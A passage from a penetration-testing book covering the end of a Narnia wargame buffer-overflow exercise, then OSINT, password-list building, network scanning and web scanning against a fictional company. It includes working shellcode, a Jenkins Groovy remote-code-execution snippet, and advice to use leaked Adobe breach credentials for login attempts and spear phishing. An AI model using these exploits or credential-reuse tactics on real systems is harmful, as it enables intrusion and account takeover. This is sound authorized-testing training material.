‚óã cat: /etc/narnia_pass/narnia3: Permission denied
We were able to get our shellcode to execute and get our shellcode to run, but for some reason we
couldn‚Äôt read the narnia3 password. Let‚Äôs try this outside of GDB:
‚óè narnia2@melinda:/narnia$ ./narnia2 `python -c 'print "\x90" * 50 +
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0+ "\x90" * 67 + "\x50\xd8\xff\xff"'`
‚óè $ cat /etc/narnia_pass/narnia3
‚óã [Answer to Narnia3 Here]
Narnia 2 ‚Äì Exploit
And there it works! We now have a privileged shell and can read the password for narnia3.
Hopefully, this gives you an initial insight into how buffer overflows work and why they work.
Remember that this was a quick 1000-foot view of binary exploitation. It is now up to you to spend
some time trying some of the other examples.
Summary
What this chapter has tried to do is to help you build a standard platform for testing, make sure you
have a strong foundation of PowerShell, and give you an understanding of the basics of binary
exploitation.
Tools will always change, so it is important to keep your testing platforms up-to-date and patched. I
have included all the tools that are used in this book and, hopefully, this information will be enough to
get you started. If you feel that I am missing any critical tools, feel free to leave comments at:
http://www.thehackerplaybook.com.
Take a full clean snapshot of your working VMs and let‚Äôs start discovering and attacking networks.
Before The Snap - Scanning The Network
The game has started and you walk onto the SUCK, Inc. field. Before the first kickoff, and before we
even attack our unsuspecting victim, we need to analyze our opponent. Studying the target for
weaknesses and understanding the environment will provide huge payoffs. This chapter will take a
look at scanning from a slightly different aspect than the normal penetration testing books and should
be seen as an additive to your current scanning processes, not as a replacement.
Whether you are a seasoned penetration tester or just starting in the game, scanning has probably been
discussed over and over again. I am not going to compare in detail all the different network scanners,
vulnerability scanners, SNMP scanners and so on, but I will try to give you my most efficient process
for scanning. This section will be broken down into Open Source Intelligence, External Scanning,
Internal Scanning, and Web Application Scanning.
Passive Discovery - Open Source Intelligence (OSINT)
Trained in Open Source Intelligence, you use your knowledge of where information exists on the
Internet to find as much information about SUCK as we can. We want to become one with these Cyber
Kittens, find their secrets, understand their verbiage, and find their employees.
Before you ever even start performing any OSINT tests, it is best if you create fake social media
accounts. Some examples of these might be (the more you have the better):
‚óè LinkedIn
‚óè Twitter
‚óè Google+
‚óè Facebook
‚óè Instagram
‚óè MySpace
‚óè Glassdoor
You don‚Äôt want to use your own personal accounts as many of the sites show who visited your pages.
This could be a quick way to get identified and potentially kill your whole mission. Now that we are
ready with the OSINT setup, let‚Äôs start gathering data.
We will start with Passive Discovery, which will search for information about the target, network,
clients, and more without ever touching the targeted host. This is great because it uses resources on
the Internet without ever alerting the target of any suspicious activity. You can also run all these
lookups prior to an engagement to save you an immense amount of time. Let‚Äôs start reviewing some
sources and tools for OSINT.
Recon-NG
(https://bitbucket.org/LaNMaSteR53/recon-ng)(Kali Linux)
Recon-NG is a great tool for querying Open Source Intelligence (OSINT) for passive information
about a company. This should be one of the first places you start before you pentest any organization.
It can give you a lot of information about IP space, naming conventions, locations, users, email
addresses, possible password leaks, and more.
Recon-ng
Prerequisites
There are some modules like Linked-In or Jigsaw that provide great value, but you do need to get API
keys for those. I will walk you through one API key example, which is free and easy to use.
To use the ipinfodb database to find the exact location of all the IPs you identify, you need to get an
API key. Go to: http://ipinfodb.com/register.php and register for a key. We will add the key to our
local store database during our next example.
To run Recon-Ng
‚óè cd /opt/recon-ng
‚óè ./recon-ng
‚óè workspaces add [Company Name - example SUCK_Company]
‚óè add domains [DOMAIN - example suck.testlab]
‚óè add companies
‚óè use recon/domains-hosts/bing_domain_web
‚óã Look through Bing for domain names
‚óè run
‚óè use recon/domains-hosts/google_site_web
‚óã Look through Google for domain names
‚óè run
‚óè use recon/domains-hosts/baidu_site
‚óã Look through Baidu (Chinese Search Engine) for domain names
‚óè run
‚óè use recon/domains-hosts/brute_hosts
‚óã Brute-force subdomains
‚óè run
‚óè use recon/domains-hosts/netcraft
‚óã Look at netcraft for domain names
‚óè run
‚óè use recon/hosts-hosts/resolve
‚óã Resolve all the domain names to IP
‚óè run
‚óè use recon/hosts-hosts/reverse_resolve
‚óã Resolve all the IPs to hostnames/domain names
‚óè run
‚óè use discovery/info_disclosure/interesting_files
‚óã Look for a few files on the identified domains
‚óè run
‚óè keys add ipinfodb_api [KEY ]
‚óã This is where you add your infodb API key from earlier
‚óè use recon/hosts-hosts/ipinfodb
‚óã Find the location of the IPs that were discovered
‚óè run
‚óè use recon/domains-contacts/whois_pocs
‚óã Find email addresses from the whois lookup
‚óè run
‚óè use recon/domains-contacts/pgp_search
‚óã Look through the public PGP store for email addresses
‚óè run
‚óè use recon/contacts-credentials/hibp_paste
‚óã This will check all of the email accounts you have gathered against
the ‚ÄúHave I Been PWN‚Äôed‚Äù website. This will let you know if there
are potentially leaked passwords that you might be able to use.
‚óè run
‚óè use reporting/html
‚óã Create a report
‚óè set CREATOR HP2
‚óè set CUSTOMER HP2
‚óè run
‚óè exit
‚óè firefox /root/.recon-ng/workspaces/SUCK_Company/results.html
This will create a report of all the findings in one single web page. Let‚Äôs take a look at what type of
valuable data has been gathered:
Recon-ng Report
From the results above, we can see that we have been able to quickly identify a ton of different
hostnames, IPs, locations, email addresses, and more. This is a great start for getting some
reconnaissance on our victim. Let‚Äôs keep gathering data!
Discover Scripts
(https://github.com/leebaird/discover) (Kali Linux)
Discover scripts by Lee Baird is still one of my favorite passive discovery tools because of the ease
of use and the amount of data gathered. Using a passive recon scan, Discover will use tools such as:
dnsrecon, goofile, goog-mail, goohost, theharvester, metasploit, urlcrazy, whois, dnssy, ewhois,
myipneighbors, and urlvoid. Discover is updated often and is a great tool for performing OSINT.
Discover Script
‚óè cd /opt/discover
‚óè ./discover.sh
‚óã 1. Domain
‚óã 1. Passive
‚óã [Company Name]
‚óã [Domain Name]
‚óã firefox /root/data/[Domain]/index.htm
The results include information about email addresses, names of employees, and hosts.
Discover Report
Some of the more interesting findings are those such as squatting and bitflipping. Discover shows us
which squatting domains have been purchased and which are currently free. In an engagement, a
doppelganger domain could prove extremely valuable for phishing, trust, or compromising victims.
Discover Domain Information
Spiderfoot
(http://www.spiderfoot.net/)(Kali Linux)
One last tool I like to use for OSINT is SpiderFoot. SpiderFoot, written by Steve Micallef, is a quick
little tool that performs a ton of different OSINT recon. Every tool queries the data slightly differently
and presents it in different fashions. Thus, it helps to have multiple tools to gather OSINT data to
compile a good view of the victim company.
Running SpiderFoot:
‚óè cd /opt/spiderfoot/spiderfoot*
‚óè python ./sf.py
‚óè open up a browser and go to http://127.0.0.1:5001/
SpiderFoot
What type of information is collected? Everything from blacklists to IPv6 addresses to Co-Hosted
Sites to E-mail addresses. As you know, every tool is maintained differently and there are many times
where one tool will find different information compared to another tool. What is good about
SpiderFoot is that it is quick, very easy, and comes back with a ton (I mean a ton) of great OSINT
information. I ran a quick scan for a site and within seconds, I found loads of information on a domain
or IP.
SpiderFoot Report
With these three sources, we should have a good idea of our victim‚Äôs open source intelligence. This
data will become very valuable later, so make sure you review all the data thoroughly.
Creating Password Lists:
From the OSINT searches, we have learned a great deal about SUCK and their organization. The next
step is to find more targeted information about the company, the people, the location, and their
customers by developing more customized password lists. We have all used large password lists in
the past and specifically in THP1, but we are looking to crack that 70%+ rate. To achieve this, we
need to create custom and smart word lists based on our victim companies and related industries.
In the last book, we used the crackstation list, which we will definitely use again, but after having a
great password base, you need to also build a list of custom passwords.
Wordhound
(https://bitbucket.org/mattinfosec/wordhound.git) (Kali Linux)
Wordhound is a tool that creates word lists and dictionaries based on Twitter searches, PDF
documents, and even Reddit sub-reddits. So to target our victim company, we can grab all the results
from their tweets and even words that might be associated with the company.{1}
Wordhound didn‚Äôt run right off the bat in Kali Linux at the time of writing this book, so I had to do a
few modifications:
‚óè git clone https://bitbucket.org/mattinfosec/wordhound.git /opt/wordhound/
‚óè apt-get install python-setuptools
‚óè cd /opt/wordhound && python setup.py install && ./setup.sh
I had some issues with tweepy, so i had to manually git clone it and re-download it:
‚óè manually install tweepy
‚óã pip install -U pip
‚óã git clone https://github.com/tweepy/tweepy.git /opt/tweepy/
‚óã cd /opt/tweepy
‚óã python ./setup.py install
‚óã /usr/local/bin/pip install requests[security]
‚óã service ntp restart
Once you get everything working, we need to edit the configuration file:
‚óè cd /opt/wordhound && gedit wordhound.conf.dist
‚óè Input the relevant information such as your twitter API key if you want to use twitter.
If you don‚Äôt currently have a Twitter API key, you can get one from here:
https://apps.twitter.com/app/new. Once you get your key, write down your:
‚óã Consumer Key (API Key)
‚óã Consumer Secret (API Secret)
‚óã Access Token
‚óã Access Token Secret
‚óè cp wordhound.conf.dist wordhound.conf
After adding these to your wordhound.conf.dist file, save or move that copy to wordhound.conf. That
is really the only initial configuration you will need to get this all working. For our first run, we are
going to first generate a dictionary from a website. This will scrape the webpage and make a unique
list of words to use for our password list.
To start Wordhound:
‚óè cd /opt/wordhound
‚óè python Main.py
‚óè 1. Generate Dictionary
‚óè 3. Create new industry
‚óã Enter industry: SUCK
‚óè 1. Generate Dictionary
‚óè 1. SUCK
‚óè 1. Create new client
‚óã SUCK
‚óè 1. Generate Dictionary from website.
‚óã http://www.securepla.net
‚óè How many levels: 3
‚óè gedit "data/industries/Hacker Playbook/Hacker Playbook/WebsiteDictionary.txt"
Wordhound - Web Results
Now, with a good list from websites, we need other sources of data to append to that list. One great
source of valuable data is Twitter. Twitter usually includes very relevant data based on specific
searching. We can use Wordhound to go through Twitter on a specific word or words and grab all the
unique words from it. Let‚Äôs run this by choosing:
‚óè 4. Generate Dictionary from twitter search term.
‚óã Search Term: hacking
‚óè gedit data/industries/Hacker\ Playbook/Hacker\
Playbook/TwitterSearchTermDictionary.txt
Wordhound ‚Äì Twitter
Wordhound - Twitter Results
Another favorite source of data is from Reddit. This is where you get creative. You need to find the
right sub-reddits that represent your company or industry. You can try a multitude of different subreddits to find out which best suit your engagement.
Since our target in this case is a security company, we can parse one of my favorite sub-reddits:
/r/netsec. Let‚Äôs see what types of unique words we can identify:
‚óè 5. Generate Dictionary from Reddit
‚óã netsec
Wordhound - Reddit
We can see from /r/netsec, that we have a lot of new words to add to our potential password list that
we might not have caught with the other lists. Target industries from different subreddits‚Äìmaybe the
city they belong to, the company, the industry, etc.
Brutescrape
(https://github.com/cheetz/brutescrape) (Kali Linux)
I had problems getting Wordhound to parse webpages properly, so until it is fixed, I created a quick
python script to scrape pages and provide unique results. BruteScrape is a tool that reads the source
of any webpage, parses out all the HTMLtags, cleans up the results, and uniques them. This is a great
quick tool to build password lists from a bulk import of websites.
‚óè cd /opt/brutescrape/
‚óè gedit sites.scrape and put in the websites you want to scrape
‚óè results are stored to passwordList.txt
BruteScrape
The customized passwords gained from BruteScrape and Wordhound, combined with the large
common password lists, give us a great start to crack and brute-force accounts.
Using Compromised Lists To Find Email Addresses And
Credentials
The great thing about being a penetration tester is that you have to get creative and use all sorts of
resources, just as if someone was malicious. One tactic that I have found to be very fruitful in the past
is using known credential dumps for password reuse. Let me explain a little more in detail.
There was a large breach of Adobe's systems. The compromised information consisted of email
addresses, encrypted passwords, and their password hints.{2} The large dump, which was almost 10
Gigabytes, was released privately in small circles and is now publicly available (try searching for
Adobe and users.tar.gz). From an attacker's perspective this is a gold mine of information. What I
generally do is parse through this file and identify the domains against which I am doing a test.
Of course, it is important to see if this type of testing is in the scope of your engagement and that you
aren't breaking any laws by obtaining a copy of any password/compromised lists. If it is a full black
box test, this should definitely be a part of your attacking approach.
For example, in the image below, I will search (using the Linux grep command: grep "@yahoo.com"
cred > hashlist.txt) through the Adobe password list for a sample domain of yahoo.com and write that
to a file named hashlist.txt (remember you should search for the domain for which you are testing).
We can see that there are many users (which I redacted) with an email address containing yahoo that
have an encrypted password and password hint.
List of Accounts/Passwords from Adobe Breach 2013
Based on the hints, you could do some research and find out who a specific user's boyfriend is or the
name of their cat, but I usually go for the quick and dirty attempt. I was able to find two groups of
researchers who, based on patterns and hints, were able to reverse some of the encrypted passwords.
Remember that from the Adobe list, since the passwords aren't hashes but encrypted passwords,
trying to reverse the passwords is much more difficult without the key. The two reversed lists I was
able to identify are:
‚óè http://stricture-group.com/files/adobe-top100.txt
‚óè http://web.mit.edu/zyan/Public/adobe_sanitized_passwords_with_bad_hints.txt (no
longer available)
I combined both these lists, cleaned them, and hosted them on my Github:
‚óè https://github.com/cheetz/adobe_password_checker/blob/master/foundpw.csv
Taking this list, I put together a short python script that parses through a list of email/encrypted
passwords and compares that against the foundpw.csv file. Let‚Äôs pull this code onto your Kali Linux
host:
‚óè git clone https://github.com/cheetz/adobe_password_checker
/opt/adobe_password_checker
‚óè cd /opt/adobe_password_checker/
The password_check.py python script will find any password matches between the hashlist.txt file
you created and the foundpw.csv file, which contains known passwords. When a match is found, the
script will return a list of email addresses and the reversed passwords. Of course, the two research
groups do not have a large number of the passwords reversed, but it should contain the low-hanging
fruit. Let's see this in action:
‚óè Make sure to copy your hashlist.txt file to /opt/adobe_password_checker/
‚óè python password_check.py
Custom Python Script to Look for Email/Passwords
I will usually take the results from this output and try the usernames/passwords against the company's
Outlook Web Access (OWA) logins or against VPN logins. You may need to play around with some
of the variables on the passwords (i.e. if they have 2012, you might want to try 2015) and also make
sure you don't lock out accounts.
I then take the email addresses gathered from these findings and use them in spear phishing
campaigns. Remember, if they are on the Adobe list, there is a good chance that these users are in the
IT group. Owning one of these accounts could be extremely beneficial.
This is why penetration testing is so much fun. You really can't just run tools‚Äìyou have to use your
own creativity to give your customer the best and most real-world types of attacks they might receive.
Don‚Äôt forget to keep checking Pastebin type sites, password dump sites, and Bittorrent files for
password leaks.
Gitrob - Github Analysis
(https://github.com/michenriksen/gitrob) (Kali Linux)
In today‚Äôs world, the ‚Äúinformation gathering game‚Äù is changing ever so rapidly. If your client is a
large client, chances are many of the developers are also on Github. This is where Gitrob comes into
play. Michael Henriksen developed a tool to search through Github for a customer and any potentially
sensitive files. These files can include secret HTTP endpoints, session IDs, user information,
passwords and API keys.
In terms of OSINT, these sources are great for gathering emails, learning about what the potential
company might be developing, default passwords, possible API keys, and more.
Configuring Gitrob:
‚óè cd /opt/gitrob/bin
‚óè ./gitrob --configure
‚óè user: gitrob
‚óè password: from what you configured during the installation
‚óè To access Github via this API, we need to first get an Access Token:
‚óã Create/Login to Github Account
‚óã Go to Settings -> Applications
‚óã Generate Token
‚óè Enter the Token into Gitrob
Gitrob search
To start a Gitrob search:
‚óè gitrob -o <orgname>
In our example below, we will test this against the org name of reddit.
Gitrob - Running
Once the scan is complete, open a browser and go to http://127.0.0.1:9393/. You will see three tabs.
The first tab is the findings. These might contain information such as references to secret HTTP
endpoints, session IDs, user information, passwords and API keys.
Gitrob - Findings
The second tab shows all the users it was able to grab, along with associated repositories.
Gitrob - Users
OSINT Data Collection
Collecting and studying a company passively is one of the most important factors in a successful
penetration test. This allows us to gain a wealth of data without ever triggering a single IDS alert.
We should now have enough information about the company, the industry, and possible user
passwords. The best part is that we found all this data passively. Let‚Äôs move on to scanning and
active discovery.
External/Internal Active Discovery
Active discovery is the process of trying to identify systems, services, and potential vulnerabilities.
We are going to target the network ranges specified in scope and scan them. Whether you are scanning
from the internal or the external segments of the network, it is important to have the right tools to
perform active discovery.
I want to emphasize that this book is not going to discuss in detail how to run a scanner, as you should
already be familiar with that. If you aren‚Äôt, then I recommend that you download the community
edition of Nexpose or get a trial version of Nessus. Try running them in a home network or even in a
lab network to get an idea of the types of findings, how to use authenticated scans, and the type of
traffic generated on a network. These scanners will trigger IDS/IPS alerts on a network very
frequently as they are extremely loud. Now that we are ready, let‚Äôs get into some of the finer details
here.
In this section, I describe the process that I like to use when scanning a network. I will use multiple
tools, processes, and techniques to try and provide efficient and effective scanning. My scanning
processes will look something like this:
‚óè Scanning with Masscan
‚óè Scanning with Sparta
‚óè Scanning with HTTP Screenshot
‚óè Scanning with Eyewitness/WMAP
‚óè Scanning using Nexpose/Nessus/OpenVAS
‚óè Scanning with Burp Proxy Pro
‚óè Scanning with ZAP Proxy
‚óè Parsing Output
Masscan
(https://github.com/robertdavidgraham/masscan) (Kali Linux)
Once you start active scanning, there are many tools to use. Historically, we have all used nmap to
map out IPs/Ports, but the game has been changing. Large ranges are a pain to scan, but this is where
Masscan comes into play. Similar to nmap (it even has similar flags), Masscan uses its own custom
TCP/IP stack for speed and efficiency. Let‚Äôs see how we would kick off a Masscan scan.
Running Masscan:
‚óè cd /opt/masscan/bin/
‚óè ./masscan -p80,8000-8100 10.0.0.0/8
‚óè ./masscan -p0-65535 --rate 150000 -oL output.txt
‚óã -p defines the ports to be scanned
‚óã --rate defines packets-per-second
‚ñ† Be careful with this setting. Make sure your VPS the
servers or that the system/network from which you run
Masscan can support the amount of traffic
‚óã -oL defines the list output to write to
For example, I ran some test scans from a VPS server:
hp2:/opt/masscan/bin$ ./masscan -p0-65535 23.239.151.0/24 --rate 150000 -oL
output.txt
Starting masscan 1.0.3 (http://bit.ly/14GZzcT) at 2015-02-02 05:46:10 GMT
-- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 256 hosts [65536 ports/host]
hp2:/opt/masscan/bin$ date
Mon Feb 2 05:48:23 UTC 2015
From the test scan above, we are looking at taking about two minutes for the configuration and systemon which we are testing. Luckily my VPS has very large networks and can support a high rate of
packets per second.
Running nmap with similar settings:
hp2:/opt/masscan/bin$ nmap -v -PN -n -sT -T5 23.239.151.0/24 -p0-65535 -oN
output_nmap.txt
Starting Nmap 6.47SVN ( http://nmap.org ) at 2015-02-02 05:53 UTC
Initiating Connect Scan at 05:53
Scanning 64 hosts [65536 ports/host]
Discovered open port 80/tcp on 23.239.151.23
Stats: 0:00:22 elapsed; 0 hosts completed (64 up), 64 undergoing Connect Scan
Connect Scan Timing: About 1.18% done; ETC: 06:26 (0:32:11 remaining)
From the in progress results above, we can see the scan will take well over 30 minutes (as it is
scanning 64 hosts at a time).
Masscan improves scanning significantly and allows a tester to scan and have results in minimal time.
One feature that really helps you configure your Masscan scans is the use of the --echo switch. The
example below writes a sample scan to a file. Reading that file configures all the different settings
that the scan will use. Once all the settings are correct, a scan can be kicked off with a ‚Äú-c‚Äù flag.
‚óè hp2:/opt/masscan/bin# ./masscan -p0-65535 23.239.151.0/24 --rate 150000 -oL
output.txt --echo > scan.conf
‚óè hp2:/opt/masscan/bin# cat scan.conf
rate = 150000.00
randomize-hosts = true
seed = 14393045175689752532
shard = 1/1
# ADAPTER SETTINGS
adapter-ip = 0.0.0.0
# OUTPUT/REPORTING SETTINGS
output-format = list
show = open,,
output-filename = output.txt
rotate = 0
# TARGET SELECTION (IP, PORTS, EXCLUDES)
ports = 0-65535
range = 23.239.151.0/24
‚Ä¶
‚óè hp2:/opt/masscan/bin#./masscan -c scan.conf
We can save this template and use it for all future scans or have a list of templates for specific types
of scans.
Sparta
(http://sparta.secforce.com/)(Kali Linux)
Throughout this book, I really try to push the ideas of efficiency and effectiveness. Scanning really
large networks works great with Masscan, but for smaller or internal networks, we can use a tool like
SPARTA.
‚ÄúSPARTA is a python GUI application which simplifies network infrastructure penetration testing by
aiding the penetration tester in the scanning and enumeration phase. It allows the tester to save time by
having point-and-click access to his toolkit and by displaying all tool output in a convenient way. If
little time is spent setting up commands and tools, more time can be spent focusing on analysing
results.‚Äù{3}
The reason I have found SPARTA to be valuable as part of my toolkit is that it runs NMAP in a
staged process. SPARTA will start an initial scan of limited ports, start Nikto for any web ports, and
performs screen capture. After the stage 1 scan finishes, it will start a much deeper stage 2 and stage
3 scan of Nmap.
Once services are identified, you can easily manually check Nikto, MySQL default credentials, and
plug directly into the Hydra password brute-force tool all via the GUI interface.
To start up SPARTA:
‚óè cd /opt/sparta/
‚óè ./sparta.py
SPARTA is really simple and straightforward to use. Once you load up the GUI console, click to add
hosts and start scanning. SPARTA takes advantage of the nmap detection to start using its auxiliary
modules.
SPARTA ‚Äì Scan
SPARTA - Nikto Scan
In the Nikto tab, we can see the results from the Nikto scan.
SPARTA - Nikto Results
SPARTA will also use cutycapt to take screenshots of the web pages.
SPARTA - Screenshot
What makes SPARTA so quick is that you can right-click on any host and send it to Hydra. In this
case, we identify a host with SSH running on HTTPS (443). We can right-click on that host and ‚ÄúSend
to Brute‚Äù.
SPARTA - Brute-force
Clicking on the Brute tab, you can supply either a single username/password combo or formpassword lists.
SPARTA - Brute
It also has additional functionality for MySQL to check default credentials.
SPARTA - MySQL Check
While you might use Masscan on large external ranges to do initial discovery, SPARTA is a valuable
tool to increase your scans.
Http Screenshot
(https://github.com/breenmachine/httpscreenshot)(Kali Linux)
One of the most efficient and effective starting points on a penetration test is understanding what
systems and services are available. Although there are plenty of network/service level exploits, I
have found most initial entry points into an organization, especially from the outside, to be via web
applications, because systems have default passwords, simple misconfigurations, or many known
web application flaws.
After the reconnaissance phase, you have identified that the Secure Universal Cyber Kittens company
has a CIDR /20 range on their externally-facing environment. That comes out to 65536 different IPs
that we need to scan and start analyzing. Sure, we kick off our vulnerability scanner in the
background, but we need to start attacking, as time is limited. Since there is no way we could visit
each and every one of those web pages, we need to automate this process and be able to utilize the
resulting data in an efficient manner.
This is where we combine both Masscan and HTTP Screenshot to scan the network and take
screenshots of the webpages. This way, we can visually look at web pages instead of visiting them
one by one. Before starting the scan, we need to configure a few settings:
‚óè cd /opt/httpscreenshot
‚óè edit masshttp.sh to make sure it points to the right masscan executable and make sure
that httpscreenshot.py points to the correct location.
‚óã instead of /root/masscan/bin/masscan, it should be
/opt/masscan/bin/masscan
‚óã instead of ~/tools/httpscreenshot.py, it should be
/opt/httpscreenshot/httpscreenshot.py
‚óè change the port to be scanned from 80,443 to
80,443,8000,8001,8080,8443,8008,9200,50070 [add your favorite web ports here]
‚óè create a file called networks.txt to put in the network cidr range you want to scan
‚óã gedit networks.txt
Let‚Äôs kick off a scan:
‚óè ./masshttp.sh
‚óè firefox ./clusters.html
With the speed of Masscan and the power of HTTP Screenshot, we have a list of websites with the
host images. There are a lot of benefits of HTTP Screenshot such as resolving certificate hostnames
for virtual/shared hosting and threading, but the biggest benefit is how it correlates similar web pages
together. You might have a ton of http basic auth pages or printers and HTTP Screenshot will
correlate them together. It makes it much easier for attacking and reporting. I will say that the output
isn‚Äôt the prettiest, but the functionality is what works.
So what are we looking for in web application screenshots? The things that should pop out are:
Why? Because we want shells! A great place to walk through to get a better understanding of
vulnerable web applications is to review the exploits themselves. Let‚Äôs stop and take a quick look at:
http://www.exploit-db.com/webapps/.
From our scan of SUCK, we see normal services like printers (which we will get into a little later),
but one thing I now often see on pentests is a couple of Jenkins hosts. This quickly stands out to me
and, as stated before, one of the benefits of HTTP Screenshot is that it puts all the Jenkins‚Äô servers
together. Jenkins is a web application that provides continuous integration services for software
development. Regardless of what it really does, it has some features that can give us our first point
into our network.
HTTP Screenshot
Unauthenticated Jenkins servers are known to have a flaw that allows remote code execution using
Groovy Script. Pentestgeek.com did a great article on how to take advantage of this vulnerability, by
visiting the Jenkins‚Äô box over port 8080 and traversing to /script/script:
‚óè http://[IP]:8080/script/script
Here, we are presented with a script console, where we can execute arbitrary Groovy Script
code{4}:
‚óè def sout = new StringBuffer(), serr = new StringBuffer()
‚óè def proc = '[Code to Execute Here]'.execute()
‚óè proc.consumeProcessOutput(sout, serr)
‚óè proc.waitForOrKill(1000)
‚óè println "out> $sout err> $serr"
This works on both Windows and *nix systems, so just make sure you first find out what system you
are attacking. In the example below, we will run a quick ‚Äúcat /etc/passwd‚Äù to make sure that we have
code execution.
Jenkins Vulnerable Server
As you can see in the results, we were able to execute and read our payloads. We won‚Äôt dive much
more in this section, but this provides a good example of how HTTP Screenshots can be beneficial.
One additional thing I want to point out when doing web screenshots is that you will sometimes run
into issues where one of the tools does not work or run into certain scenarios where you need more
information. I always tell my readers to never focus on one tool, and in this case there are two other
tools to look at:
Eyewitness - https://www.christophertruncer.com/eyewitness-triage-tool/ ended up really replacing
Peepingtom, which was talked about in the first book. Eyewitness works great, but I have had
problems on large scans. These might be fixed by now, but this was just one of the many issues I kept
running into.
One other tool that I would look into is an interesting project called WMAP Network Scanning. The
gap they are trying to solve is that these web scrapers don‚Äôt generally handle or render Flash or Java.
On those special pentests where you have a ton of these types of sites, you could look into this
Chrome Extension:
‚óè http://thehackerblog.com/wmap-a-chrome-extension-for-taking-screenshots-of-webservices/
‚óè https://chrome.google.com/webstore/detail/wmap/pflahkdjlekaeehbenhpkpipgkbbdbbHow WMAP works is that it uses Chrome to open a new tab with the IP and takes a picture of the
page. It takes advantage of the fact that the browser will do all the rendering.
Configuring WMAP is extremely simple after the installation of the Chrome plugin.
WAMP
WAMP Results
I do have some problems with this tool, mainly with speed and how it opens a tab for each site, but it
does render things that Peepingtom and Eyewitness cannot since it uses the browser.
Vulnerability Scanning:
After performing initial scans and mapping out the network, I usually like to kick off a couple of
vulnerability scans in the background. I will go over a few tools to help you with vulnerability
scanning.
Rapid7 Nexpose/Tenable Nessus
(Kali/Windows/OS X):
Two of the most common vulnerability-scanning tools I see are Rapid7 Nexpose and Tenable Nessus.
Like I said in the last book, there is always a huge war about which one of the scanners is better, and
again I offer this caveat: I have used most of the commercial scanners and have never found one to be
perfect or the right solution. When comparing these tools, I have seen that there are always some
findings that are discovered and missed by certain tools. The best idea would be to run multiple tools,
but this isn't always the most financially acceptable solution. My quick two cents is that if you are
going to purchase a single license, I would recommend getting Tenable's Nessus Vulnerability
Scanner. For the number of IPs you can scan and the cost ($1,500), it is the most reasonable. I have
found that a single consultant license of NeXpose is double the price and limited on the number of IPs
you can scan, but I ask that you verify, as you never know when prices might change. In terms of
performance and ease of use, for large complex networks, I prefer the management interface on
NeXpose. In terms of finding odd vulnerabilities, Nessus takes the cake on this one. They definitely
do a lot of research on embedded devices and SCADA (and the like), where I don‚Äôt see those types of
findings on my Rapid7 reports.
The best option here is to give both of them a trial:
‚óè Rapid7 NeXpose:
http://www.rapid7.com/products/nexpose/compare-downloads.jsp
‚óè Tenable Nessus:
www.tenable.com/products/nessus/evaluate
Openvas
(http://www.openvas.org/)(Kali)
Since I do discuss a lot about commercial tools, as I mentioned in previous chapters, I want to be
able to complement them with Open Source tools. There is a decent open source vulnerability tool
that you can also use in your arsenal. Open Vulnerability Assessment System (OpenVAS) is a great
tool for learning and testing vulnerabilities. Compared to the commercial tools, from my experience,
OpenVas does pick up a lot of the similar findings, but I have noticed on engagements that it misses
potentially high findings. I have also noticed that with OpenVAS, I had a lot of trouble when things
break. When it breaks, it breaks hard and a lot of manual work is needed to get it back up and running.
The positive side of OpenVAS is that it does do all the things required by a scanner. It can run
different configurations, do authenticated scans, create reports, and even distribute scans over
multiple nodes.
To get OpenVAS up and running, from a command prompt on your Kali host, type:
‚óè openvas-setup
‚óè openvas-scapdata-sync
‚óè openvas-certdata-sync
‚óè openvas-adduser
‚óè gsd
Enter the server address as localhost and the username/password of the account you created during
the setup phase.
OpenVAS
Once you login, you can go right to starting a scan:
‚óè Tasks -> New
‚óè Click on the Blue Star on Scan Targets
‚óè Add your IP ranges and Create the Scan
OpenVAS Settings
It is pretty straightforward to start and kick off a vulnerability scan as your tasks should be prepopulated at the bottom pane of Greenbone Security Desktop. Once you see your task, you can rightclick on that task and click ‚ÄúStart.‚Äù
OpenVAS - Starting Scan
Once the scan completes, you can go over to the report tab or export the report to a PDF format.
OpenVAS ‚Äì Results
This vsftpd vulnerability was the one that we found on the Metasploitable 2 box, which we used to
exploit with Metasploit in the prior section.
OpenVAS ‚Äì Findings
Vulnerability scanning is still an important factor in any penetration test, though it definitely is not the
be-all and end-all for offensive testing. If you look at real world examples, other than external
scanning, most attacks do not incorporate a lot of internal scans. This is because they are loud, trigger
intrusion detection systems, and, at times, take down services. Instead, they focus on moving quietly
through the network, taking knowledge gained from each step to move laterally, and the importance of
data exfiltration.
Web Application Scanning
Scanning the SUCK network, we should now have a good idea of what the infrastructure and running
services look like. We have done our research on OSINT tools, created password lists, and we have
run our vulnerability scanner. So what‚Äôs next? Since most companies these days actually do run
vulnerability scanners across their networks, although I still do come across ms08-067, but it is
becoming much less frequent. If you do come across an infrastructure that does patch generally well,
then web application scanning on a network pentest can be extremely helpful.
After I start the network scanners and get a layout with the active discovery tools, I begin my web
application scanners. In web scanning, I am going to mainly focus on one tool. There are a lot of good
open source/free tools available to use, such as ZAP, WebScarab, Nikto, w3af, etc. In this case, I am
going for the quickest, most efficient way to perform a test. Although the Burp Suite Pro
(http://portswigger.net/burp/) is a commercial tool, it only costs around $300. This is well worth the
cost as it is actively maintained, has a lot of capabilities for manual testing, and many security
researchers develop extensions for Burp.
Similar to the discussion of vulnerability scanners, this isn't going to be a comprehensive guide to
accomplishing web application penetration tests, but more of what is performed during a network
penetration test. If you want to focus on testing a single application thoroughly, you are going to want
to look into both source code analysis (using something like HP Fortify) and in-depth application
testing (a great resource for this is a book called The Web Application Hacker's Handbook: Finding
and Exploiting Security Flaws). Let's dive into how to efficiently use Burp Suite.
The Process For Web Scanning
In this section, I describe how I use Burp Suite Pro to scan web applications during a network
penetration test. Usually, I won't have enough time during a network pen-test to do a full web
application test, but these are the steps I take when I identify larger applications:
‚óè Spider/Discovery/Scanning with Burp Pro
‚óè Scanning with a web application scanner
‚óè Manual parameter injection
‚óè Session token analysis
Web Application Scanning
After running a tool like Nessus or Nexpose to find the common system/application/service
vulnerabilities, it is time to dig into the application. I am going describe how to use Burp Suite and
get you to start looking deeper into the application. The following steps will:
1) Configure Your Network Proxy
2) Enable Burp Suite
3) Spider through the application
4) Discover Content
5) Run the Active Scanner
6) Exploit
Configuring Your Network Proxy and Browser
Remember that the Burp Suite tool works by configuring your web browser to talk through the Burp
Suite application and then to the web application(s). This will give you full visibility in the requests
made by the browser and also give you the ability to modify the raw requests regardless of client side
protections.
First, you are going to want to start Burp Suite by running the JAR file on either the Windows or Kali
system. Once you have Burp up and running, you want to make sure your proxy is enabled and
